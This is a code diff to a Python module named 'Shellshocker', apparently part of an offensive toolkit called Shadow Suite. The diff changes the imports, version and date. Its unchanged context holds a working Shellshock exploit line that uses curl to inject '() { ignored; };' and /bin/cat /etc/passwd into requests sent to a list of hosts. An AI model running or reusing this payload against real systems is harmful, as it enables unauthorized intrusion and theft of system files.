@@ -11,7 +11,7 @@
 try:
     import os
     import sys
-    import core.error
+    from core import error
     import API
     # Uncomment the line above if your module will use Shadow Suite's API.
 
@@ -23,12 +23,12 @@ except ImportError:
 # Put your module information here.
 info = {
         "name": "Shellshocker", # Module filename (Change this; I recommend you to use the filename as the module name.)
-        "version": "2.0", # version
+        "version": "3.0", # version
         "author": "NullArray", # Author
         "desc": "A bash script that tests [a list of] hosts for the shellshock vulnerability.", # Brief description
         "email": "none", # Email
         "authorinfo": "Ported to Python 3 by Catayao56", # Additional information about the author; this could be
-        "lastupdate": "Mar. 05, 2018",                     # a website of the author.
+        "lastupdate": "Mar. 21, 2018",                     # a website of the author.
         # The date format is MONTH, DD, YYYY e.g.: Jan. 4, 2018
         "usingapi": "True", # Is this module using Shadow Suite's API?
         "needsroot": "1", # Does this module needs root permissions?
@@ -84,7 +84,7 @@ def main():
     from the 'os' module, and will immediately call 'module_body()' function. """
     if info['needsroot'] == "0":
         if os.geteuid() != 0:
-            core.error.error0005()
+            print(error.error0005)
 
         else:
             module_body()
@@ -112,4 +112,4 @@ def module_body():
     output = 'output/' + output_name
     os.system("cat " + path_to_hosts + " | xargs -I % bash -c \'curl % -H \"custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" && echo ----END OF RESPONSE----\' | tee " + output)
     os.system("rm " + path_to_hosts)
-    API.Class().finish()
+    print(API.ShadowSuiteLE().finish)
